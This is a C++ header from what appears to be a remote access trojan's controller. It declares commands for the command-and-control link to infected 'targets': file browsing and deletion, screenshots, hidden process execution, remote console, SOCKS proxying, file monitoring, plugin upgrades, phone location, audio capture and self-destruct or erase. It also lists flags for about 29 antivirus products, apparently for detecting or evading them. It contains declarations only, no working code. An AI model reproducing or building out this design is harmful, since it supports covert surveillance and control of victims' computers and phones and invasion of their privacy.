/*!
	Description : 主网络连接
	Author		: Ruining Song
	Date		: 2013.12.10
	Remark		:
		
			2013.12.10
				
				>> 添加文件监控命令 FMT
*/

#ifndef ControlConnectionH
#define ControlConnectionH
//---------------------------------------------------------------------------
#include "connection.h"
#include "target.h"

#define ANTI_NOTHING            0x00000000         // 无
#define ANTI_360			    0x00000001         // 360                  
#define ANTI_RISING			    0x00000002         // 瑞星                 
#define ANTI_AVIRA		    	0x00000004         // Avira， 小红伞       
#define ANTI_KAP		    	0x00000008         // 卡巴斯基             
#define ANTI_QQ     	    	0x00000010         // QQ                   
#define ANTI_JIANGMIN	    	0x00000020         // KV，江民
#define ANTI_V3LITE             0x00000040         // AhnLab V3 lite 安博士
#define ANTI_FETS               0x00000080         // 费尔托斯
#define ANTI_MPMON              0x00000100         // 微点
#define ANTI_NORTON             0x00000200         // 诺顿                 
#define ANTI_KINGSOFT    		0x00000400         // 金山安全
#define ANTI_TREND				0x00000800		   // 趋势科技
#define ANTI_PANDA              0x00001000         // Panda, 熊猫
#define ANTI_MCAFEE             0x00002000         // mcaffee
#define ANTI_SKY                0x00004000         // 天网安全
#define ANTI_QUZHUJIAN          0x00008000         // 驱逐舰
#define ANTI_BITDEFENDER        0x00010000         // BitDefender
#define ANTI_AVG				0x00020000		   // avg
#define ANTI_GDATA              0x00040000         // G DATA
#define ANTI_TRUSTPORT			0x00080000		   // Trust port
#define ANTI_COMODO				0x00100000		   // Comodo
#define ANTI_BAIDU				0x00200000		   // Baidu
#define ANTI_ANTIAN				0x00400000		   // 安天
#define ANTI_AVAST				0x00800000		   // avast
#define ANTI_FSECURE			0x01000000		   // f-secure
#define ANTI_NPROTECT			0x02000000		   // n-protect
#define ANTI_SPIDER				0x04000000		   // 大蜘蛛
#define ANTI_Sophos				0x08000000		   // Sophos

//---------------------------------------------------------------------------

class ControlConnection : public Connection
{

public:
     ControlConnection(SOCKET sock);

	 void FlowStatistics(unsigned int bytes) { }

protected:

	virtual void  HandleIncomingData();
    virtual void  ConnectionCompleted();
    virtual void  ConnectionClosed();

public:
    void  Send_Identity();
    void  Send_HEL();
    void  Send_INI();
    void  Send_FLD();

    // 查询和设置中转服务器迁移信息
    //
    void  Send_QDA(ULONG targetId);
    void  Send_SDA(PBYTE lpData, DWORD dwDataSize);

	void  Send_SDA(ULONG targetId, DWORD value);

    // 插件相关
    //
    void  Send_PLI(ULONG targetId);       // 查询插件信息
    void  Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen);       // 设置插件属性
    void  StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType);
    void  Send_UPL(DWORD       dwPluginId,
                             DWORD       dwNewPlgVer,
                             DWORD       dwStartPos,                             
                             std::string flag,
                             PCHAR       lpData,
                             DWORD       dwDataLen,
							 DWORD		 dwOsType);

    void  Send_STA(ULONG targetId);       // 查询目标状态
    void  Send_PNG();                     // 保持响应
        
    void  Send_LIR(ULONG targetId);                       // 查询目标盘符列表
    void  Send_DIR(ULONG targetId,   const char *base64Path);     // 查询目标目录信息
    void  Send_FDL(ULONG targetId,   const char *base64Path);     // 删除目标上的某个文件
    
    // 目标操作: 自毁、静默、清除
    //
    void  Send_ERA(ULONG targetId);
    void  Send_SDS(ULONG targetId);
    void  Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd);

    // 截屏
    //
    void  Send_SCP(ULONG  targetID);

    // 在线搜索
    //
    void  Send_OSC(ULONG          targetID,
                             ULONG          osId,
                             const char*          tarDirPathBase64,
                             ULONG          level,
                             PSearchFilter  lpSearchFilter);                    // 启动搜索

    void  Send_OSF(ULONG          targetID,
                             ULONG          osId);                              // 停止搜索

    // Socks代理
    //
    void  Send_SSX(ULONG ulTargetID,  USHORT usPort); // 启动
    void  Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass); // 启动
    void  Send_ESX(ULONG ulTargetID);                                 // 停止

    // plugin manager cmd (direct to target)
    //
    void  Send_PLG(ULONG targetId, ULONG   pluginId, char    *plgType);
    
    void  Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec);
    
    // 远近扩展执行
    //
    void  Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO);
    void  Send_CITW(DWORD dwTargetID, std::wstring widInput);
    void  Send_CITA(DWORD dwTargetID, std::string aniInput);
    void  Send_CFI(DWORD dwTargetID);

	// 文件监控
	void Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext);

	// 获取所在地（手机专用）
	void Send_GPRS(DWORD dwTargetId);
	int Handle_GPRS(std::vector<std::string> & args);

	// 自动获取
	void Send_AGT(
		ULONG      targetID,
		TaskDirect taskDirect,
		const char*      tarDirPathBase64,
		ULONG      level,
		ULONG      autoDown);

	// 背景音
	void Send_BACKSOUND(ULONG targetID, bool open, ULONG time);

private:

  	//static std::map<std::string,CtrCmdHandler > commandHandlers;
    
    int   DispatchCommand(std::vector<std::string> & args);
    void  RegisterCommandHandlers();

    int   Handle_OUT(std::vector<std::string> & args);
    
    int   Handle_HEL(std::vector<std::string> & args);
    int   Handle_INI(std::vector<std::string> & args);
    int   Handle_TAR(std::vector<std::string> & args);
    int   Handle_CIN(std::vector<std::string> & args);
    int   Handle_STA(std::vector<std::string> & args);
    int   Handle_LOG(std::vector<std::string> & args);

    int   Handle_TSW(std::vector<std::string> & args);

    int   Handle_QDA(std::vector<std::string> & args);
    
    int   Handle_QNG(std::vector<std::string> & args);
    
    int   Handle_LIR(std::vector<std::string> & args);
    int   Handle_DIR(std::vector<std::string> & args);
    int   Handle_FDL(std::vector<std::string> & args);
    
    // 截屏
    //
    int   Handle_SCP(std::vector<std::string> & args);

    // 在线搜索
    //
    int   Handle_OSC(std::vector<std::string> & args);            // 搜索启动
    int   Handle_OSF(std::vector<std::string> & args);            // 人工停止或结束
    int   Handle_OSI(std::vector<std::string> & args);            // 得到搜索项

    // Socks代理
    //
    int   Handle_SSX(std::vector<std::string> & args);
    int   Handle_ESX(std::vector<std::string> & args);

    // 插件相关
    //
    int   Handle_PLI(std::vector<std::string> & args);
    int   Handle_PLD(std::vector<std::string> & args);
    int   Handle_UPL(std::vector<std::string> & args);            // 升级插件到中转服务器
    
    int   Handle_PLG(std::vector<std::string> & args);

    int   Handle_CRP(std::vector<std::string> & args);
    int   Handle_RUN(std::vector<std::string> & args);
    int   Handle_CIT(std::vector<std::string> & args);            // Console Input
    int   Handle_COT(std::vector<std::string> & args);            // Console Output
    int   Handle_CFI(std::vector<std::string> & args);            // Console Finished

    int   Handle_ERA(std::vector<std::string> & args);
    int   Handle_SDS(std::vector<std::string> & args);
    int   Handle_SIL(std::vector<std::string> & args);

	// 文件监控
	int Handle_FMT(std::vector<std::string> &args);

	// 背景音
	int Handle_BACKSOUND(std::vector<std::string>& args);

public:
    DWORD   dwCtrUserId;
    
    PFileTask	PlgUptFileTask[32][MAX_PLG_COUNT];		// 专门用于插件升级的文件任务，这一类任务并不参与中转的任务调度，直接走控制连接
};

//typedef int  (ControlConnection::* CtrCmdHandler)(std::vector<std::string> &);
//extern std::map<std::string,CtrCmdHandler > commandHandlers;

#endif
